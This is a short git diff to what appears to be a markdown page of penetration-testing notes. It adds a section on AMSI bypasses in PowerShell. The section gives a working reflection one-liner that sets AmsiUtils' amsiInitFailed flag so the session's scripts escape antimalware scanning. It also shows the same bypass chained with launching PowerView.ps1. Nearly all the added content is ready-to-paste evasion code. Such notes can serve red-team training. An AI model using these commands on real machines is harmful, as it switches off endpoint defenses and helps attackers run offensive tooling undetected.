@@ -41,3 +41,17 @@ $s = [Ref].Assembly.GetTypes();ForEach($b in $s) {if ($b.Name -like "*iUtils") {
 * Can generate many AMSI Bypassess on https://amsi.fail&#x20;
 * Simply paste into powershell prompt.
 * If successful AMSI is patched and the rest of your session will not be scanned by AMSI
+
+### AMSI Bypass stacking with Powershell
+
+* Can do an session AMSI bypass by pasting command in powershell prompt&#x20;
+
+```
+$s = [Ref].Assembly.GetTypes();ForEach($b in $s) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true); 
+```
+
+* Or you can also stack it with a specific command
+
+```
+$s = [Ref].Assembly.GetTypes();ForEach($b in $s) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true); .\PowerView.ps1 
+```
